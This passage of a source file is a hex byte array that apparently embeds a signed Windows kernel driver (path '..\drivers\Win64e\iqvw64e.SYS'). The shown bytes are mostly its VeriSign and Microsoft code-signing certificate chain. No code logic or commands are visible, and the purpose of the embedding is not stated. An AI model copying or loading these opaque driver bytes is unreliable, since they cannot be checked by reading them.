    0x04, 0x04, 0x03, 0x02, 0x01, 0x86, 0x30, 0x1D, 0x06, 0x03, 0x55, 0x1D, 0x0E, 0x04, 0x16, 0x04,
    0x14, 0x7F, 0xD3, 0x65, 0xA7, 0xC2, 0xDD, 0xEC, 0xBB, 0xF0, 0x30, 0x09, 0xF3, 0x43, 0x39, 0xFA,
    0x02, 0xAF, 0x33, 0x31, 0x33, 0x30, 0x1F, 0x06, 0x03, 0x55, 0x1D, 0x23, 0x04, 0x18, 0x30, 0x16,
    0x80, 0x14, 0x62, 0xFB, 0x0A, 0x21, 0x5B, 0x7F, 0x43, 0x6E, 0x11, 0xDA, 0x09, 0x54, 0x50, 0x6B,
    0xF5, 0xD2, 0x96, 0x71, 0xF1, 0x9E, 0x30, 0x55, 0x06, 0x03, 0x55, 0x1D, 0x1F, 0x04, 0x4E, 0x30,
    0x4C, 0x30, 0x4A, 0xA0, 0x48, 0xA0, 0x46, 0x86, 0x44, 0x68, 0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F,
    0x63, 0x72, 0x6C, 0x2E, 0x6D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x2E, 0x63, 0x6F,
    0x6D, 0x2F, 0x70, 0x6B, 0x69, 0x2F, 0x63, 0x72, 0x6C, 0x2F, 0x70, 0x72, 0x6F, 0x64, 0x75, 0x63,
    0x74, 0x73, 0x2F, 0x4D, 0x69, 0x63, 0x72, 0x6F, 0x73, 0x6F, 0x66, 0x74, 0x43, 0x6F, 0x64, 0x65,
    0x56, 0x65, 0x72, 0x69, 0x66, 0x52, 0x6F, 0x6F, 0x74, 0x2E, 0x63, 0x72, 0x6C, 0x30, 0x0D, 0x06,
    0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x05, 0x05, 0x00, 0x03, 0x82, 0x02, 0x01,
    0x00, 0x81, 0x2A, 0x82, 0x16, 0x8C, 0x34, 0x67, 0x2B, 0xE5, 0x03, 0xEB, 0x34, 0x7B, 0x8C, 0xA2,
    0xA3, 0x50, 0x8A, 0xF4, 0x55, 0x86, 0xF1, 0x1E, 0x8C, 0x8E, 0xAE, 0x7D, 0xEE, 0x03, 0x19, 0xCE,
    0x72, 0x95, 0x18, 0x48, 0xAD, 0x62, 0x11, 0xFD, 0x20, 0xFD, 0x3F, 0x47, 0x06, 0x01, 0x5A, 0xE2,
    0xE0, 0x6F, 0x8C, 0x15, 0x2C, 0x4E, 0x3C, 0x6A, 0x50, 0x6C, 0x0B, 0x36, 0xA3, 0xCF, 0x7A, 0x0D,
    0x9C, 0x42, 0xBC, 0x5C, 0xF8, 0x19, 0xD5, 0x60, 0xE3, 0x69, 0xE6, 0xE2, 0x23, 0x41, 0x67, 0x8C,
    0x68, 0x83, 0x76, 0x2B, 0x8F, 0x93, 0xA3, 0x2A, 0xB5, 0x7F, 0xBE, 0x59, 0xFB, 0xA9, 0xC9, 0xB2,
    0x26, 0x8F, 0xCA, 0xA2, 0xF3, 0x82, 0x1B, 0x98, 0x3E, 0x91, 0x95, 0x27, 0x97, 0x86, 0x61, 0xEE,
    0x5B, 0x5D, 0x07, 0x6B, 0xCD, 0x86, 0xA8, 0xE2, 0x65, 0x80, 0xA8, 0xE2, 0x15, 0xE2, 0xB2, 0xBE,
    0x23, 0x05, 0x6A, 0xBA, 0x0C, 0xF3, 0x47, 0x93, 0x4D, 0xAC, 0xA4, 0x8C, 0x07, 0x79, 0x39, 0xC0,
    0x61, 0x12, 0x3A, 0x05, 0x0D, 0x89, 0xA3, 0xEC, 0x9F, 0x57, 0x89, 0x84, 0xFB, 0xEC, 0xCA, 0x7C,
    0x47, 0x66, 0x14, 0x91, 0xD8, 0xB6, 0x0F, 0x19, 0x5D, 0xE6, 0xB8, 0x4A, 0xAC, 0xBC, 0x47, 0xC8,
    0x71, 0x43, 0x96, 0xE6, 0x32, 0x20, 0xA5, 0xDC, 0x77, 0x86, 0xFD, 0x3C, 0xE3, 0x8B, 0x71, 0xDB,
    0x7B, 0x9B, 0x03, 0xFC, 0xB7, 0x1D, 0x32, 0x64, 0xEB, 0x16, 0x52, 0xA0, 0x43, 0xA3, 0xFA, 0x2E,
    0xAD, 0x59, 0x92, 0x4E, 0x7C, 0xC7, 0xF2, 0x33, 0x42, 0x48, 0x38, 0x51, 0x3A, 0x7C, 0x38, 0xC7,
    0x1B, 0x24, 0x22, 0x28, 0x40, 0x1E, 0x1A, 0x46, 0x1F, 0x17, 0xDB, 0x18, 0xF7, 0xF0, 0x27, 0x35,
    0x6C, 0xB8, 0x63, 0xD9, 0xCD, 0xB9, 0x64, 0x5D, 0x2B, 0xA5, 0x5E, 0xEF, 0xC6, 0x29, 0xB4, 0xF2,
    0xC7, 0xF8, 0x21, 0xCC, 0x04, 0xBA, 0x57, 0xFD, 0x01, 0xB6, 0xAB, 0xC6, 0x67, 0xF9, 0xE7, 0xD3,
    0x99, 0x7F, 0xF4, 0xF5, 0x22, 0xFA, 0x72, 0xF5, 0xFD, 0xFF, 0x3A, 0x1C, 0x42, 0x3A, 0xA1, 0xF9,
    0x80, 0x18, 0xA5, 0xEE, 0x8D, 0x1C, 0xD4, 0x66, 0x9E, 0x45, 0x01, 0xFE, 0xAA, 0xEE, 0xFF, 0xFB,
    0x17, 0x8F, 0x30, 0xF7, 0xF1, 0xCD, 0x29, 0xC5, 0x9D, 0xEC, 0xB5, 0xD5, 0x49, 0x00, 0x3D, 0x85,
    0xB8, 0xCB, 0xBB, 0x93, 0x3A, 0x27, 0x6A, 0x49, 0xC0, 0x30, 0xAE, 0x66, 0xC9, 0xF7, 0x23, 0x28,
    0x32, 0x76, 0xF9, 0xA4, 0x83, 0x56, 0xC8, 0x48, 0xCE, 0x5A, 0x96, 0xAA, 0xA0, 0xCC, 0x0C, 0xC4,
    0x7F, 0xB4, 0x8E, 0x97, 0xAF, 0x6D, 0xE3, 0x54, 0x27, 0xC3, 0x9F, 0x86, 0xC0, 0xD6, 0xE4, 0x73,
    0x08, 0x97, 0x05, 0xDB, 0xD0, 0x54, 0x62, 0x5E, 0x03, 0x48, 0xC2, 0xD5, 0x9F, 0x7F, 0xA7, 0x66,
    0x8C, 0xD0, 0x9D, 0xB0, 0x4F, 0xD4, 0xD3, 0x98, 0x5F, 0x4B, 0x7A, 0xC9, 0x7F, 0xB2, 0x29, 0x52,
    0xD0, 0x12, 0x80, 0xC7, 0x0F, 0x54, 0xB6, 0x1E, 0x67, 0xCD, 0xC6, 0xA0, 0x6C, 0x11, 0x03, 0x84,
    0xD3, 0x48, 0x75, 0xE7, 0x2A, 0xFE, 0xB0, 0x3B, 0x6E, 0x0A, 0x3A, 0xA6, 0x6B, 0x76, 0x99, 0x05,
    0xA3, 0xF1, 0x77, 0x68, 0x61, 0x33, 0x14, 0x47, 0x06, 0xFC, 0x53, 0x7F, 0x52, 0xBD, 0x92, 0x14,
    0x5C, 0x4A, 0x24, 0x6A, 0x67, 0x8C, 0xAF, 0x8D, 0x90, 0xAA, 0xD0, 0xF6, 0x79, 0x21, 0x1B, 0x93,
    0x26, 0x7C, 0xC3, 0xCE, 0x1E, 0xBD, 0x88, 0x38, 0x92, 0xAE, 0x45, 0xC6, 0x19, 0x6A, 0x49, 0x50,
    0xB3, 0x05, 0xF8, 0xAE, 0x59, 0x37, 0x8A, 0x6A, 0x25, 0x03, 0x94, 0xB1, 0x59, 0x81, 0x50, 0xE8,
    0xBA, 0x83, 0x80, 0xB7, 0x23, 0x35, 0xF4, 0x76, 0xB9, 0x67, 0x1D, 0x59, 0x18, 0xAD, 0x20, 0x8D,
    0x94, 0x30, 0x82, 0x06, 0x0A, 0x30, 0x82, 0x04, 0xF2, 0xA0, 0x03, 0x02, 0x01, 0x02, 0x02, 0x10,
    0x52, 0x00, 0xE5, 0xAA, 0x25, 0x56, 0xFC, 0x1A, 0x86, 0xED, 0x96, 0xC9, 0xD4, 0x4B, 0x33, 0xC7,
    0x30, 0x0D, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x05, 0x05, 0x00, 0x30,
    0x81, 0xCA, 0x31, 0x0B, 0x30, 0x09, 0x06, 0x03, 0x55, 0x04, 0x06, 0x13, 0x02, 0x55, 0x53, 0x31,
    0x17, 0x30, 0x15, 0x06, 0x03, 0x55, 0x04, 0x0A, 0x13, 0x0E, 0x56, 0x65, 0x72, 0x69, 0x53, 0x69,
    0x67, 0x6E, 0x2C, 0x20, 0x49, 0x6E, 0x63, 0x2E, 0x31, 0x1F, 0x30, 0x1D, 0x06, 0x03, 0x55, 0x04,
    0x0B, 0x13, 0x16, 0x56, 0x65, 0x72, 0x69, 0x53, 0x69, 0x67, 0x6E, 0x20, 0x54, 0x72, 0x75, 0x73,
    0x74, 0x20, 0x4E, 0x65, 0x74, 0x77, 0x6F, 0x72, 0x6B, 0x31, 0x3A, 0x30, 0x38, 0x06, 0x03, 0x55,
    0x04, 0x0B, 0x13, 0x31, 0x28, 0x63, 0x29, 0x20, 0x32, 0x30, 0x30, 0x36, 0x20, 0x56, 0x65, 0x72,
    0x69, 0x53, 0x69, 0x67, 0x6E, 0x2C, 0x20, 0x49, 0x6E, 0x63, 0x2E, 0x20, 0x2D, 0x20, 0x46, 0x6F,
    0x72, 0x20, 0x61, 0x75, 0x74, 0x68, 0x6F, 0x72, 0x69, 0x7A, 0x65, 0x64, 0x20, 0x75, 0x73, 0x65,
    0x20, 0x6F, 0x6E, 0x6C, 0x79, 0x31, 0x45, 0x30, 0x43, 0x06, 0x03, 0x55, 0x04, 0x03, 0x13, 0x3C,
    0x56, 0x65, 0x72, 0x69, 0x53, 0x69, 0x67, 0x6E, 0x20, 0x43, 0x6C, 0x61, 0x73, 0x73, 0x20, 0x33,
    0x20, 0x50, 0x75, 0x62, 0x6C, 0x69, 0x63, 0x20, 0x50, 0x72, 0x69, 0x6D, 0x61, 0x72, 0x79, 0x20,
    0x43, 0x65, 0x72, 0x74, 0x69, 0x66, 0x69, 0x63, 0x61, 0x74, 0x69, 0x6F, 0x6E, 0x20, 0x41, 0x75,
    0x74, 0x68, 0x6F, 0x72, 0x69, 0x74, 0x79, 0x20, 0x2D, 0x20, 0x47, 0x35, 0x30, 0x1E, 0x17, 0x0D,
    0x31, 0x30, 0x30, 0x32, 0x30, 0x38, 0x30, 0x30, 0x30, 0x30, 0x30, 0x30, 0x5A, 0x17, 0x0D, 0x32,
    0x30, 0x30, 0x32, 0x30, 0x37, 0x32, 0x33, 0x35, 0x39, 0x35, 0x39, 0x5A, 0x30, 0x81, 0xB4, 0x31,
    0x0B, 0x30, 0x09, 0x06, 0x03, 0x55, 0x04, 0x06, 0x13, 0x02, 0x55, 0x53, 0x31, 0x17, 0x30, 0x15,
    0x06, 0x03, 0x55, 0x04, 0x0A, 0x13, 0x0E, 0x56, 0x65, 0x72, 0x69, 0x53, 0x69, 0x67, 0x6E, 0x2C,
    0x20, 0x49, 0x6E, 0x63, 0x2E, 0x31, 0x1F, 0x30, 0x1D, 0x06, 0x03, 0x55, 0x04, 0x0B, 0x13, 0x16,
    0x56, 0x65, 0x72, 0x69, 0x53, 0x69, 0x67, 0x6E, 0x20, 0x54, 0x72, 0x75, 0x73, 0x74, 0x20, 0x4E,
    0x65, 0x74, 0x77, 0x6F, 0x72, 0x6B, 0x31, 0x3B, 0x30, 0x39, 0x06, 0x03, 0x55, 0x04, 0x0B, 0x13,
    0x32, 0x54, 0x65, 0x72, 0x6D, 0x73, 0x20, 0x6F, 0x66, 0x20, 0x75, 0x73, 0x65, 0x20, 0x61, 0x74,
    0x20, 0x68, 0x74, 0x74, 0x70, 0x73, 0x3A, 0x2F, 0x2F, 0x77, 0x77, 0x77, 0x2E, 0x76, 0x65, 0x72,
    0x69, 0x73, 0x69, 0x67, 0x6E, 0x2E, 0x63, 0x6F, 0x6D, 0x2F, 0x72, 0x70, 0x61, 0x20, 0x28, 0x63,
    0x29, 0x31, 0x30, 0x31, 0x2E, 0x30, 0x2C, 0x06, 0x03, 0x55, 0x04, 0x03, 0x13, 0x25, 0x56, 0x65,
    0x72, 0x69, 0x53, 0x69, 0x67, 0x6E, 0x20, 0x43, 0x6C, 0x61, 0x73, 0x73, 0x20, 0x33, 0x20, 0x43,
    0x6F, 0x64, 0x65, 0x20, 0x53, 0x69, 0x67, 0x6E, 0x69, 0x6E, 0x67, 0x20, 0x32, 0x30, 0x31, 0x30,
    0x20, 0x43, 0x41, 0x30, 0x82, 0x01, 0x22, 0x30, 0x0D, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7,
    0x0D, 0x01, 0x01, 0x01, 0x05, 0x00, 0x03, 0x82, 0x01, 0x0F, 0x00, 0x30, 0x82, 0x01, 0x0A, 0x02,
    0x82, 0x01, 0x01, 0x00, 0xF5, 0x23, 0x4B, 0x5E, 0xA5, 0xD7, 0x8A, 0xBB, 0x32, 0xE9, 0xD4, 0x57,
    0xF7, 0xEF, 0xE4, 0xC7, 0x26, 0x7E, 0xAD, 0x19, 0x98, 0xFE, 0xA8, 0x9D, 0x7D, 0x94, 0xF6, 0x36,
    0x6B, 0x10, 0xD7, 0x75, 0x81, 0x30, 0x7F, 0x04, 0x68, 0x7F, 0xCB, 0x2B, 0x75, 0x1E, 0xCD, 0x1D,
    0x08, 0x8C, 0xDF, 0x69, 0x94, 0xA7, 0x37, 0xA3, 0x9C, 0x7B, 0x80, 0xE0, 0x99, 0xE1, 0xEE, 0x37,
    0x4D, 0x5F, 0xCE, 0x3B, 0x14, 0xEE, 0x86, 0xD4, 0xD0, 0xF5, 0x27, 0x35, 0xBC, 0x25, 0x0B, 0x38,
    0xA7, 0x8C, 0x63, 0x9D, 0x17, 0xA3, 0x08, 0xA5, 0xAB, 0xB0, 0xFB, 0xCD, 0x6A, 0x62, 0x82, 0x4C,
    0xD5, 0x21, 0xDA, 0x1B, 0xD9, 0xF1, 0xE3, 0x84, 0x3B, 0x8A, 0x2A, 0x4F, 0x85, 0x5B, 0x90, 0x01,
    0x4F, 0xC9, 0xA7, 0x76, 0x10, 0x7F, 0x27, 0x03, 0x7C, 0xBE, 0xAE, 0x7E, 0x7D, 0xC1, 0xDD, 0xF9,
    0x05, 0xBC, 0x1B, 0x48, 0x9C, 0x69, 0xE7, 0xC0, 0xA4, 0x3C, 0x3C, 0x41, 0x00, 0x3E, 0xDF, 0x96,
    0xE5, 0xC5, 0xE4, 0x94, 0x71, 0xD6, 0x55, 0x01, 0xC7, 0x00, 0x26, 0x4A, 0x40, 0x3C, 0xB5, 0xA1,
    0x26, 0xA9, 0x0C, 0xA7, 0x6D, 0x80, 0x8E, 0x90, 0x25, 0x7B, 0xCF, 0xBF, 0x3F, 0x1C, 0xEB, 0x2F,
    0x96, 0xFA, 0xE5, 0x87, 0x77, 0xC6, 0xB5, 0x56, 0xB2, 0x7A, 0x3B, 0x54, 0x30, 0x53, 0x1B, 0xDF,
    0x62, 0x34, 0xFF, 0x1E, 0xD1, 0xF4, 0x5A, 0x93, 0x28, 0x85, 0xE5, 0x4C, 0x17, 0x4E, 0x7E, 0x5B,
    0xFD, 0xA4, 0x93, 0x99, 0x7F, 0xDF, 0xCD, 0xEF, 0xA4, 0x75, 0xEF, 0xEF, 0x15, 0xF6, 0x47, 0xE7,
    0xF8, 0x19, 0x72, 0xD8, 0x2E, 0x34, 0x1A, 0xA6, 0xB4, 0xA7, 0x4C, 0x7E, 0xBD, 0xBB, 0x4F, 0x0C,
    0x3D, 0x57, 0xF1, 0x30, 0xD6, 0xA6, 0x36, 0x8E, 0xD6, 0x80, 0x76, 0xD7, 0x19, 0x2E, 0xA5, 0xCD,
    0x7E, 0x34, 0x2D, 0x89, 0x02, 0x03, 0x01, 0x00, 0x01, 0xA3, 0x82, 0x01, 0xFE, 0x30, 0x82, 0x01,
    0xFA, 0x30, 0x12, 0x06, 0x03, 0x55, 0x1D, 0x13, 0x01, 0x01, 0xFF, 0x04, 0x08, 0x30, 0x06, 0x01,
    0x01, 0xFF, 0x02, 0x01, 0x00, 0x30, 0x70, 0x06, 0x03, 0x55, 0x1D, 0x20, 0x04, 0x69, 0x30, 0x67,
    0x30, 0x65, 0x06, 0x0B, 0x60, 0x86, 0x48, 0x01, 0x86, 0xF8, 0x45, 0x01, 0x07, 0x17, 0x03, 0x30,
    0x56, 0x30, 0x28, 0x06, 0x08, 0x2B, 0x06, 0x01, 0x05, 0x05, 0x07, 0x02, 0x01, 0x16, 0x1C, 0x68,
    0x74, 0x74, 0x70, 0x73, 0x3A, 0x2F, 0x2F, 0x77, 0x77, 0x77, 0x2E, 0x76, 0x65, 0x72, 0x69, 0x73,
    0x69, 0x67, 0x6E, 0x2E, 0x63, 0x6F, 0x6D, 0x2F, 0x63, 0x70, 0x73, 0x30, 0x2A, 0x06, 0x08, 0x2B,
    0x06, 0x01, 0x05, 0x05, 0x07, 0x02, 0x02, 0x30, 0x1E, 0x1A, 0x1C, 0x68, 0x74, 0x74, 0x70, 0x73,
    0x3A, 0x2F, 0x2F, 0x77, 0x77, 0x77, 0x2E, 0x76, 0x65, 0x72, 0x69, 0x73, 0x69, 0x67, 0x6E, 0x2E,
    0x63, 0x6F, 0x6D, 0x2F, 0x72, 0x70, 0x61, 0x30, 0x0E, 0x06, 0x03, 0x55, 0x1D, 0x0F, 0x01, 0x01,
    0xFF, 0x04, 0x04, 0x03, 0x02, 0x01, 0x06, 0x30, 0x6D, 0x06, 0x08, 0x2B, 0x06, 0x01, 0x05, 0x05,
    0x07, 0x01, 0x0C, 0x04, 0x61, 0x30, 0x5F, 0xA1, 0x5D, 0xA0, 0x5B, 0x30, 0x59, 0x30, 0x57, 0x30,
    0x55, 0x16, 0x09, 0x69, 0x6D, 0x61, 0x67, 0x65, 0x2F, 0x67, 0x69, 0x66, 0x30, 0x21, 0x30, 0x1F,
    0x30, 0x07, 0x06, 0x05, 0x2B, 0x0E, 0x03, 0x02, 0x1A, 0x04, 0x14, 0x8F, 0xE5, 0xD3, 0x1A, 0x86,
    0xAC, 0x8D, 0x8E, 0x6B, 0xC3, 0xCF, 0x80, 0x6A, 0xD4, 0x48, 0x18, 0x2C, 0x7B, 0x19, 0x2E, 0x30,
    0x25, 0x16, 0x23, 0x68, 0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F, 0x6C, 0x6F, 0x67, 0x6F, 0x2E, 0x76,
    0x65, 0x72, 0x69, 0x73, 0x69, 0x67, 0x6E, 0x2E, 0x63, 0x6F, 0x6D, 0x2F, 0x76, 0x73, 0x6C, 0x6F,
    0x67, 0x6F, 0x2E, 0x67, 0x69, 0x66, 0x30, 0x34, 0x06, 0x03, 0x55, 0x1D, 0x1F, 0x04, 0x2D, 0x30,
    0x2B, 0x30, 0x29, 0xA0, 0x27, 0xA0, 0x25, 0x86, 0x23, 0x68, 0x74, 0x74, 0x70, 0x3A, 0x2F, 0x2F,
    0x63, 0x72, 0x6C, 0x2E, 0x76, 0x65, 0x72, 0x69, 0x73, 0x69, 0x67, 0x6E, 0x2E, 0x63, 0x6F, 0x6D,
    0x2F, 0x70, 0x63, 0x61, 0x33, 0x2D, 0x67, 0x35, 0x2E, 0x63, 0x72, 0x6C, 0x30, 0x34, 0x06, 0x08,
    0x2B, 0x06, 0x01, 0x05, 0x05, 0x07, 0x01, 0x01, 0x04, 0x28, 0x30, 0x26, 0x30, 0x24, 0x06, 0x08,
    0x2B, 0x06, 0x01, 0x05, 0x05, 0x07, 0x30, 0x01, 0x86, 0x18, 0x68, 0x74, 0x74, 0x70, 0x3A, 0x2F,
    0x2F, 0x6F, 0x63, 0x73, 0x70, 0x2E, 0x76, 0x65, 0x72, 0x69, 0x73, 0x69, 0x67, 0x6E, 0x2E, 0x63,
    0x6F, 0x6D, 0x30, 0x1D, 0x06, 0x03, 0x55, 0x1D, 0x25, 0x04, 0x16, 0x30, 0x14, 0x06, 0x08, 0x2B,
    0x06, 0x01, 0x05, 0x05, 0x07, 0x03, 0x02, 0x06, 0x08, 0x2B, 0x06, 0x01, 0x05, 0x05, 0x07, 0x03,
    0x03, 0x30, 0x28, 0x06, 0x03, 0x55, 0x1D, 0x11, 0x04, 0x21, 0x30, 0x1F, 0xA4, 0x1D, 0x30, 0x1B,
    0x31, 0x19, 0x30, 0x17, 0x06, 0x03, 0x55, 0x04, 0x03, 0x13, 0x10, 0x56, 0x65, 0x72, 0x69, 0x53,
    0x69, 0x67, 0x6E, 0x4D, 0x50, 0x4B, 0x49, 0x2D, 0x32, 0x2D, 0x38, 0x30, 0x1D, 0x06, 0x03, 0x55,
    0x1D, 0x0E, 0x04, 0x16, 0x04, 0x14, 0xCF, 0x99, 0xA9, 0xEA, 0x7B, 0x26, 0xF4, 0x4B, 0xC9, 0x8E,
    0x8F, 0xD7, 0xF0, 0x05, 0x26, 0xEF, 0xE3, 0xD2, 0xA7, 0x9D, 0x30, 0x1F, 0x06, 0x03, 0x55, 0x1D,
    0x23, 0x04, 0x18, 0x30, 0x16, 0x80, 0x14, 0x7F, 0xD3, 0x65, 0xA7, 0xC2, 0xDD, 0xEC, 0xBB, 0xF0,
    0x30, 0x09, 0xF3, 0x43, 0x39, 0xFA, 0x02, 0xAF, 0x33, 0x31, 0x33, 0x30, 0x0D, 0x06, 0x09, 0x2A,
    0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x05, 0x05, 0x00, 0x03, 0x82, 0x01, 0x01, 0x00, 0x56,
    0x22, 0xE6, 0x34, 0xA4, 0xC4, 0x61, 0xCB, 0x48, 0xB9, 0x01, 0xAD, 0x56, 0xA8, 0x64, 0x0F, 0xD9,
    0x8C, 0x91, 0xC4, 0xBB, 0xCC, 0x0C, 0xE5, 0xAD, 0x7A, 0xA0, 0x22, 0x7F, 0xDF, 0x47, 0x38, 0x4A,
    0x2D, 0x6C, 0xD1, 0x7F, 0x71, 0x1A, 0x7C, 0xEC, 0x70, 0xA9, 0xB1, 0xF0, 0x4F, 0xE4, 0x0F, 0x0C,
    0x53, 0xFA, 0x15, 0x5E, 0xFE, 0x74, 0x98, 0x49, 0x24, 0x85, 0x81, 0x26, 0x1C, 0x91, 0x14, 0x47,
    0xB0, 0x4C, 0x63, 0x8C, 0xBB, 0xA1, 0x34, 0xD4, 0xC6, 0x45, 0xE8, 0x0D, 0x85, 0x26, 0x73, 0x03,
    0xD0, 0xA9, 0x8C, 0x64, 0x6D, 0xDC, 0x71, 0x92, 0xE6, 0x45, 0x05, 0x60, 0x15, 0x59, 0x51, 0x39,
    0xFC, 0x58, 0x14, 0x6B, 0xFE, 0xD4, 0xA4, 0xED, 0x79, 0x6B, 0x08, 0x0C, 0x41, 0x72, 0xE7, 0x37,
    0x22, 0x06, 0x09, 0xBE, 0x23, 0xE9, 0x3F, 0x44, 0x9A, 0x1E, 0xE9, 0x61, 0x9D, 0xCC, 0xB1, 0x90,
    0x5C, 0xFC, 0x3D, 0xD2, 0x8D, 0xAC, 0x42, 0x3D, 0x65, 0x36, 0xD4, 0xB4, 0x3D, 0x40, 0x28, 0x8F,
    0x9B, 0x10, 0xCF, 0x23, 0x26, 0xCC, 0x4B, 0x20, 0xCB, 0x90, 0x1F, 0x5D, 0x8C, 0x4C, 0x34, 0xCA,
    0x3C, 0xD8, 0xE5, 0x37, 0xD6, 0x6F, 0xA5, 0x20, 0xBD, 0x34, 0xEB, 0x26, 0xD9, 0xAE, 0x0D, 0xE7,
    0xC5, 0x9A, 0xF7, 0xA1, 0xB4, 0x21, 0x91, 0x33, 0x6F, 0x86, 0xE8, 0x58, 0xBB, 0x25, 0x7C, 0x74,
    0x0E, 0x58, 0xFE, 0x75, 0x1B, 0x63, 0x3F, 0xCE, 0x31, 0x7C, 0x9B, 0x8F, 0x1B, 0x96, 0x9E, 0xC5,
    0x53, 0x76, 0x84, 0x5B, 0x9C, 0xAD, 0x91, 0xFA, 0xAC, 0xED, 0x93, 0xBA, 0x5D, 0xC8, 0x21, 0x53,
    0xC2, 0x82, 0x53, 0x63, 0xAF, 0x12, 0x0D, 0x50, 0x87, 0x11, 0x1B, 0x3D, 0x54, 0x52, 0x96, 0x8A,
    0x2C, 0x9C, 0x3D, 0x92, 0x1A, 0x08, 0x9A, 0x05, 0x2E, 0xC7, 0x93, 0xA5, 0x48, 0x91, 0xD3, 0x31,
    0x82, 0x04, 0xB1, 0x30, 0x82, 0x04, 0xAD, 0x02, 0x01, 0x01, 0x30, 0x81, 0xC9, 0x30, 0x81, 0xB4,
    0x31, 0x0B, 0x30, 0x09, 0x06, 0x03, 0x55, 0x04, 0x06, 0x13, 0x02, 0x55, 0x53, 0x31, 0x17, 0x30,
    0x15, 0x06, 0x03, 0x55, 0x04, 0x0A, 0x13, 0x0E, 0x56, 0x65, 0x72, 0x69, 0x53, 0x69, 0x67, 0x6E,
    0x2C, 0x20, 0x49, 0x6E, 0x63, 0x2E, 0x31, 0x1F, 0x30, 0x1D, 0x06, 0x03, 0x55, 0x04, 0x0B, 0x13,
    0x16, 0x56, 0x65, 0x72, 0x69, 0x53, 0x69, 0x67, 0x6E, 0x20, 0x54, 0x72, 0x75, 0x73, 0x74, 0x20,
    0x4E, 0x65, 0x74, 0x77, 0x6F, 0x72, 0x6B, 0x31, 0x3B, 0x30, 0x39, 0x06, 0x03, 0x55, 0x04, 0x0B,
    0x13, 0x32, 0x54, 0x65, 0x72, 0x6D, 0x73, 0x20, 0x6F, 0x66, 0x20, 0x75, 0x73, 0x65, 0x20, 0x61,
    0x74, 0x20, 0x68, 0x74, 0x74, 0x70, 0x73, 0x3A, 0x2F, 0x2F, 0x77, 0x77, 0x77, 0x2E, 0x76, 0x65,
    0x72, 0x69, 0x73, 0x69, 0x67, 0x6E, 0x2E, 0x63, 0x6F, 0x6D, 0x2F, 0x72, 0x70, 0x61, 0x20, 0x28,
    0x63, 0x29, 0x31, 0x30, 0x31, 0x2E, 0x30, 0x2C, 0x06, 0x03, 0x55, 0x04, 0x03, 0x13, 0x25, 0x56,
    0x65, 0x72, 0x69, 0x53, 0x69, 0x67, 0x6E, 0x20, 0x43, 0x6C, 0x61, 0x73, 0x73, 0x20, 0x33, 0x20,
    0x43, 0x6F, 0x64, 0x65, 0x20, 0x53, 0x69, 0x67, 0x6E, 0x69, 0x6E, 0x67, 0x20, 0x32, 0x30, 0x31,
    0x30, 0x20, 0x43, 0x41, 0x02, 0x10, 0x27, 0x76, 0xAB, 0x5C, 0xF2, 0xD0, 0x98, 0x72, 0xF1, 0xAD,
    0x05, 0xFB, 0xC3, 0xF2, 0x1A, 0x87, 0x30, 0x09, 0x06, 0x05, 0x2B, 0x0E, 0x03, 0x02, 0x1A, 0x05,
    0x00, 0xA0, 0x81, 0xAE, 0x30, 0x19, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x09,
    0x03, 0x31, 0x0C, 0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x01, 0x04, 0x30,
    0x1C, 0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x01, 0x0B, 0x31, 0x0E, 0x30,
    0x0C, 0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x01, 0x15, 0x30, 0x23, 0x06,
    0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x09, 0x04, 0x31, 0x16, 0x04, 0x14, 0xBF, 0x5E,
    0x19, 0x5A, 0x26, 0xCE, 0xEE, 0x79, 0x35, 0x43, 0x4E, 0x90, 0xC2, 0xE7, 0xF9, 0xE7, 0xE9, 0xB9,
    0x18, 0x48, 0x30, 0x4E, 0x06, 0x0A, 0x2B, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x01, 0x0C,
    0x31, 0x40, 0x30, 0x3E, 0xA0, 0x3C, 0x80, 0x3A, 0x00, 0x2E, 0x00, 0x2E, 0x00, 0x5C, 0x00, 0x64,
    0x00, 0x72, 0x00, 0x69, 0x00, 0x76, 0x00, 0x65, 0x00, 0x72, 0x00, 0x73, 0x00, 0x5C, 0x00, 0x57,
    0x00, 0x69, 0x00, 0x6E, 0x00, 0x36, 0x00, 0x34, 0x00, 0x65, 0x00, 0x5C, 0x00, 0x69, 0x00, 0x71,
    0x00, 0x76, 0x00, 0x77, 0x00, 0x36, 0x00, 0x34, 0x00, 0x65, 0x00, 0x2E, 0x00, 0x53, 0x00, 0x59,
    0x00, 0x53, 0x30, 0x0D, 0x06, 0x09, 0x2A, 0x86, 0x48, 0x86, 0xF7, 0x0D, 0x01, 0x01, 0x01, 0x05,
    0x00, 0x04, 0x82, 0x01, 0x00, 0x38, 0x2A, 0xB5, 0x14, 0xC2, 0x12, 0xD3, 0x1C, 0x90, 0x31, 0xF0,
    0x6C, 0xC9, 0x16, 0x5A, 0xDD, 0x0B, 0x6E, 0x95, 0x0B, 0x1F, 0x57, 0x0A, 0x1C, 0xDC, 0x08, 0xED,
    0xD5, 0x95, 0x01, 0x9E, 0x92, 0x50, 0x1E, 0x82, 0x1D, 0x31, 0x61, 0xE7, 0x10, 0x66, 0x78, 0xC0,
    0x50, 0x45, 0x71, 0x40, 0x11, 0x3F, 0x60, 0xC0, 0xBF, 0xDF, 0x61, 0xB7, 0x25, 0x80, 0x31, 0x91,
    0x38, 0x38, 0x39, 0x4A, 0xB4, 0x1C, 0x94, 0xA2, 0x8B, 0xBD, 0xAA, 0xE1, 0x7C, 0x68, 0x68, 0x2D,
